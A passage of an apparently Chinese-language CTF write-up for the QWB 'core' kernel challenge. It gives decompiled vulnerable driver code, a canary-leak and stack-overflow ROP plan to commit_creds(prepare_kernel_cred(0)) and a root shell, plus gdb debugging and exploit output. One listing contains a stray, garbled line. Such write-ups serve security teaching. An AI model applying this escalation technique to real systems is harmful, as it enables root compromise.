+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="kr">__int64</span> <span class="nf">exit_core</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kr">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax
+</span><span class="c1"></span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">core_proc</span> <span class="p">)</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">remove_proc_entry</span><span class="p">(</span><span class="s">&#34;core&#34;</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><strong>core_ioctl()</strong> 定义了三条命令，分别调用 <strong>core_read()</strong>，<strong>core_copy_func()</strong> 和设置全局变量 <strong>off</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">core_ioctl</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a3</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">switch</span> <span class="p">(</span> <span class="n">a2</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">case</span> <span class="mh">0x6677889B</span><span class="o">:</span>
+      <span class="n">core_read</span><span class="p">(</span><span class="n">a3</span><span class="p">);</span>
+      <span class="k">break</span><span class="p">;</span>
+    <span class="k">case</span> <span class="mh">0x6677889C</span><span class="o">:</span>
+      <span class="n">printk</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x016c</span><span class="s">ore: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+      <span class="n">off</span> <span class="o">=</span> <span class="n">a3</span><span class="p">;</span>
+      <span class="k">break</span><span class="p">;</span>
+    <span class="k">case</span> <span class="mh">0x6677889A</span><span class="o">:</span>
+      <span class="n">printk</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x016c</span><span class="s">ore: called core_copy</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+      <span class="n">core_copy_func</span><span class="p">(</span><span class="n">a3</span><span class="p">);</span>
+      <span class="k">break</span><span class="p">;</span>
+  <span class="p">}</span>
+      <span class="n">core_copy_func</span><span class="p">(</span><span class="n">v3</span><span class="p">);</span>
+<span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><strong>core_read()</strong> 从 <code>v4[off]</code> 拷贝 64 个字节到用户空间，但要注意的是全局变量 <code>off</code> 使我们能够控制的，因此可以合理的控制 <code>off</code> 来 leak canary 和一些地址</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="nf">core_read</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// rbx
+</span><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">v2</span><span class="p">;</span> <span class="c1">// rdi
+</span><span class="c1"></span>  <span class="kt">signed</span> <span class="kr">__int64</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// rcx
+</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">v4</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-50h]
+</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+40h] [rbp-10h]
+</span><span class="c1"></span>
+  <span class="n">v1</span> <span class="o">=</span> <span class="n">a1</span><span class="p">;</span>
+  <span class="n">v5</span> <span class="o">=</span> <span class="n">__readgsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="n">printk</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x016c</span><span class="s">ore: called core_read</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+  <span class="n">printk</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x016</span><span class="s">%d %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+  <span class="n">v2</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
+  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">16LL</span><span class="p">;</span> <span class="n">i</span><span class="p">;</span> <span class="o">--</span><span class="n">i</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">v2</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">strcpy</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="s">&#34;Welcome to the QWB CTF challenge.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">copy_to_user</span><span class="p">(</span><span class="n">v1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v4</span><span class="p">[</span><span class="n">off</span><span class="p">],</span> <span class="mi">64LL</span><span class="p">)</span> <span class="p">)</span>
+    <span class="kr">__asm</span> <span class="p">{</span> <span class="n">swapgs</span> <span class="p">}</span>
+<span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><strong>core_copy_func()</strong> 从全局变量 <code>name</code> 中拷贝数据到局部变量中，长度是由我们指定的，当要注意的是 qmemcpy 用的是 <code>unsigned __int16</code>，但传递的长度是 <code>signed __int64</code>，因此如果控制传入的长度为 <code>0xffffffffffff0000|(0x100)</code> 等值，就可以栈溢出了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="nf">core_copy_func</span><span class="p">(</span><span class="kt">signed</span> <span class="kr">__int64</span> <span class="n">a1</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">v1</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-50h]
+</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+40h] [rbp-10h]
+</span><span class="c1"></span>
+  <span class="n">v2</span> <span class="o">=</span> <span class="n">__readgsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="n">printk</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x016c</span><span class="s">ore: called core_writen&#34;</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">a1</span> <span class="o">&gt;</span> <span class="mi">63</span> <span class="p">)</span>
+    <span class="n">printk</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x016D</span><span class="s">etect Overflow&#34;</span><span class="p">);</span>
+  <span class="k">else</span>
+    <span class="n">qmemcpy</span><span class="p">(</span><span class="n">v1</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int16</span><span class="p">)</span><span class="n">a1</span><span class="p">);</span>    <span class="c1">// overflow
+</span><span class="c1"></span><span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><strong>core_write()</strong> 向全局变量 <code>name</code> 上写，这样通过 <code>core_write()</code> 和 <code>core_copy_func()</code> 就可以控制 ropchain 了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">signed</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">core_write</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a2</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">a3</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// rbx
+</span><span class="c1"></span>
+  <span class="n">v3</span> <span class="o">=</span> <span class="n">a3</span><span class="p">;</span>
+  <span class="n">printk</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x016c</span><span class="s">ore: called core_writen&#34;</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">&lt;=</span> <span class="mh">0x800</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">copy_from_user</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">v3</span><span class="p">)</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">v3</span><span class="p">;</span>
+  <span class="n">printk</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x016c</span><span class="s">ore: error copying data from userspacen&#34;</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mh">0xFFFFFFF2LL</span><span class="p">;</span>
+<span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div>
+<h4 id="思路-1">思路</h4>
+
+<p>经过如上的分析，可以得出以下的思路：</p>
+
+<ol>
+<li>通过 ioctl 设置 off，然后通过 core_read() leak 出 canary</li>
+<li>通过 core_write() 向 name 写，构造 ropchain</li>
+<li>通过 core_copy_func() 从 name 向局部变量上写，通过设置合理的长度和 canary 进行 rop</li>
+<li>通过 rop 执行 <code>commit_creds(prepare_kernel_cred(0))</code></li>
+<li>返回用户态，通过 system(&ldquo;/bin/sh&rdquo;) 等起 shell</li>
+</ol>
+
+<p>解释一下：</p>
+
+<ul>
+<li>如何获得 commit_creds()，prepare_kernel_cred() 的地址？
+
+<ul>
+<li>/tmp/kallsyms 中保存了这些地址，可以直接读取，同时根据偏移固定也能确定 gadgets 的地址</li>
+</ul></li>
+
+<li><p>如何返回用户态？</p>
+
+<ul>
+<li><code>swapgs; iretq</code>，之前说过需要设置 <code>cs, rflags</code> 等信息，可以写一个函数保存这些信息</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="c1">// intel flavor assembly
+</span><span class="c1"></span><span class="n">size_t</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">;</span>
+<span class="kt">void</span> <span class="nf">save_status</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">__asm__</span><span class="p">(</span><span class="s">&#34;mov user_cs, cs;&#34;</span>
+            <span class="s">&#34;mov user_ss, ss;&#34;</span>
+            <span class="s">&#34;mov user_sp, rsp;&#34;</span>
+            <span class="s">&#34;pushf;&#34;</span>
+            <span class="s">&#34;pop user_rflags;&#34;</span>
+            <span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*]status has been saved.&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// at&amp;t flavor assembly
+</span><span class="c1"></span><span class="kt">void</span> <span class="nf">save_stats</span><span class="p">()</span> <span class="p">{</span>
+<span class="k">asm</span><span class="p">(</span>
+    <span class="s">&#34;movq %%cs, %0</span><span class="se">\n</span><span class="s">&#34;</span>
+    <span class="s">&#34;movq %%ss, %1</span><span class="se">\n</span><span class="s">&#34;</span>
+    <span class="s">&#34;movq %%rsp, %3</span><span class="se">\n</span><span class="s">&#34;</span>
+    <span class="s">&#34;pushfq</span><span class="se">\n</span><span class="s">&#34;</span>
+    <span class="s">&#34;popq %2</span><span class="se">\n</span><span class="s">&#34;</span>
+    <span class="o">:</span><span class="s">&#34;=r&#34;</span><span class="p">(</span><span class="n">user_cs</span><span class="p">),</span> <span class="s">&#34;=r&#34;</span><span class="p">(</span><span class="n">user_ss</span><span class="p">),</span> <span class="s">&#34;=r&#34;</span><span class="p">(</span><span class="n">user_eflags</span><span class="p">),</span><span class="s">&#34;=r&#34;</span><span class="p">(</span><span class="n">user_sp</span><span class="p">)</span>
+    <span class="o">:</span>
+    <span class="o">:</span> <span class="s">&#34;memory&#34;</span>
+<span class="p">);</span>
+<span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div></li>
+
+<li><p>Why bother returning to Userspace?</p>
+
+<ul>
+<li>Most useful things we want to do are much easier from userland.</li>
+<li>In KernelSpace, there’s no easy way to:
+
+<ul>
+<li>Modify the filesystem</li>
+<li>Create a new process</li>
+<li>Create network connections</li>
+</ul></li>
+</ul></li>
+</ul>
+
+<h4 id="exploit-1">Exploit</h4>
+
+<p>先说一下怎么调试，qemu 内置有 gdb 的接口，通过 help 查看</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">give_to_player <span class="o">[</span>master●●<span class="o">]</span> qemu-system-x86_64 --help <span class="p">|</span> grep gdb
+-gdb dev        <span class="nb">wait</span> <span class="k">for</span> gdb connection on <span class="s1">&#39;dev&#39;</span>
+-s              shorthand <span class="k">for</span> -gdb tcp::1234</code></pre></td></tr></table>
+</div>
+</div>
+<p>即可以通过 <code>-gdb tcp:port</code> 或者 <code>-s</code> 来开启调试端口，<code>start.sh</code> 中已经有了 <code>-s</code>，不必再自己设置。</p>
+
+<p>另外通过 <code>gdb ./vmlinux</code> 启动时，虽然加载了 kernel 的符号表，但没有加载驱动 <code>core.ko</code> 的符号表，可以通过 <code>add-symbol-file core.ko textaddr</code> 加载</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">pwndbg&gt; <span class="nb">help</span> add-symbol-file
+Load symbols from FILE, assuming FILE has been dynamically loaded.
+Usage: add-symbol-file FILE ADDR <span class="o">[</span>-s &lt;SECT&gt; &lt;SECT_ADDR&gt; -s &lt;SECT&gt; &lt;SECT_ADDR&gt; ...<span class="o">]</span>
+ADDR is the starting address of the file<span class="err">&#39;</span>s text.
+The optional arguments are section-name section-address pairs and
+should be specified <span class="k">if</span> the data and bss segments are not contiguous
+with the text.  SECT is a section name to be loaded at SECT_ADDR.</code></pre></td></tr></table>
+</div>
+</div>
+<p>.text 段的地址可以通过 <code>/sys/modules/core/section/.text</code> 来查看，查看需要 root 权限，因此为了方便调试，我们再改一下 <code>init</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># setsid /bin/cttyhack setuidgid 1000 /bin/sh
+</span><span class="c1"></span>setsid /bin/cttyhack setuidgid <span class="m">0</span> /bin/sh</code></pre></td></tr></table>
+</div>
+</div>
+<p>重新打包，这样启动的时候就是 root 权限了。</p>
+
+<p>比如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">// qemu 内
+/ <span class="c1"># cat /sys/module/core/sections/.text 
+</span><span class="c1"></span>0xffffffffc018b000
+......
+......
+
+// qemu 外
+give_to_player <span class="o">[</span>master●●<span class="o">]</span> gdb ./vmlinux -q
+pwndbg: loaded <span class="m">174</span> commands. Type pwndbg <span class="o">[</span>filter<span class="o">]</span> <span class="k">for</span> a list.
+pwndbg: created <span class="nv">$rebase</span>, <span class="nv">$ida</span> gdb functions <span class="o">(</span>can be used with print/break<span class="o">)</span>
+Reading symbols from ./vmlinux...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
+pwndbg&gt; add-symbol-file ./core.ko 0xffffffffc018b000
+add symbol table from file <span class="s2">&#34;./core.ko&#34;</span> at
+	.text_addr <span class="o">=</span> 0xffffffffc018b000
+Reading symbols from ./core.ko...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
+pwndbg&gt; b core_read					<span class="c1"># 加载了符号表，就可以直接对函数下断点了
+</span><span class="c1"></span>Breakpoint <span class="m">1</span> at 0xffffffffc018b063
+pwndbg&gt; b *<span class="o">(</span>0xffffffffc018b000+0xCC<span class="o">)</span><span class="c1"># 或者根据基地址直接下断点
+</span><span class="c1"></span>Breakpoint <span class="m">2</span> at 0xffffffffc018b0cc
+pwndbg&gt; target remote localhost:1234
+Remote debugging using localhost:1234
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+0xffffffffa1e6e7d2 in ?? <span class="o">()</span>
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+LEGEND: STACK <span class="p">|</span> HEAP <span class="p">|</span> CODE <span class="p">|</span> DATA <span class="p">|</span> RWX <span class="p">|</span> RODATA
+──────────────────────────────────────<span class="o">[</span> REGISTERS <span class="o">]</span>──────────────────────────────────────
+ RAX  0xffffffffa1e6e7d0 ◂— sti     /* 0x2e66001f0fc3f4fb */
+ RBX  0xffffffffa2810480 ◂— 0x80000000
+ RCX  0x0
+ RDX  0x0
+ RDI  0x0
+ RSI  0x0
+ R8   0xffff8f250641bf20 —▸ 0xffffb0f380647960 ◂— <span class="m">1</span>
+ R9   0x0
+ R10  0x0
+ R11  0x32e
+ R12  0xffffffffa2810480 ◂— 0x80000000
+ R13  0xffffffffa2810480 ◂— 0x80000000
+ R14  0x0
+ R15  0x0
+ RBP  0x0
+ RSP  0xffffffffa2803eb8 —▸ 0xffffffffa16b65a0 ◂— 0xff894cf6894c9feb
+ RIP  0xffffffffa1e6e7d2 ◂— ret     /* 0x1f0f2e66001f0fc3 */
+───────────────────────────────────────<span class="o">[</span> DISASM <span class="o">]</span>────────────────────────────────────────
+ ► 0xffffffffa1e6e7d2    ret    &lt;0xffffffffa16b65a0&gt;
+    ↓
+   0xffffffffa16b65a0    jmp    0xffffffffa16b6541
+    ↓
+   0xffffffffa16b6541    or     byte ptr ds:<span class="o">[</span>r12 + <span class="m">2</span><span class="o">]</span>, 0x20
+   0xffffffffa16b6548    pushfq
+   0xffffffffa16b6549    pop    rax
+   0xffffffffa16b654a    <span class="nb">test</span>   ah, <span class="m">2</span>
+   0xffffffffa16b654d    je     0xffffffffa16b65e5
+
+   0xffffffffa16b6553    call   0xffffffffa16d4720
+
+   0xffffffffa16b6558    call   0xffffffffa16b6430
+
+   0xffffffffa16b655d    mov    rax, qword ptr <span class="o">[</span>rbx<span class="o">]</span>
+   0xffffffffa16b6560    <span class="nb">test</span>   al, <span class="m">8</span>
+────────────────────────────────────────<span class="o">[</span> STACK <span class="o">]</span>────────────────────────────────────────
+<span class="m">00</span>:0000│ rsp  0xffffffffa2803eb8 —▸ 0xffffffffa16b65a0 ◂— 0xff894cf6894c9feb
+<span class="m">01</span>:0008│      0xffffffffa2803ec0 ◂— 0xc2
+<span class="m">02</span>:0010│      0xffffffffa2803ec8 —▸ 0xffffffffa2cc4900 ◂— 0xcccccccccccccccc
+<span class="m">03</span>:0018│      0xffffffffa2803ed0 —▸ 0xffff8f2506688900 ◂— jb     0xffff8f2506688971 /* 0x65642f3d746f6f72<span class="p">;</span> <span class="s1">&#39;root=/dev/ram&#39;</span> */
+<span class="m">04</span>:0020│      0xffffffffa2803ed8 —▸ 0xffffffffa2ccc2c0 ◂— 0xcccccccccccccccc
+<span class="m">05</span>:0028│      0xffffffffa2803ee0 ◂— 0x0
+... ↓
+<span class="m">07</span>:0038│      0xffffffffa2803ef0 —▸ 0xffffffffa16b673a ◂— jmp    0xffffffffa16b6735 /* 0x564190909090f9eb */
+pwndbg&gt; c
+Continuing.
+......
+......
+
+
+// qemu 内
+/ <span class="c1"># /tmp/exploit
+</span><span class="c1"></span><span class="o">[</span>*<span class="o">]</span>status has been saved.
+commit_creds addr: 0xffffffffa169c8e0
+vmlinux_base addr: 0xffffffffa1600000
+prepare_kernel_cred addr: 0xffffffffa169cce0
+<span class="o">[</span>*<span class="o">]</span><span class="nb">set</span> off to <span class="m">64</span>
+<span class="o">[</span>*<span class="o">]</span><span class="nb">read</span> to buf.
+......
+......
+
+// qemu 外
+pwndbg&gt; c
+Continuing.
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+
+Breakpoint <span class="m">1</span>, 0xffffffffc018b063 in core_read <span class="o">()</span>
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
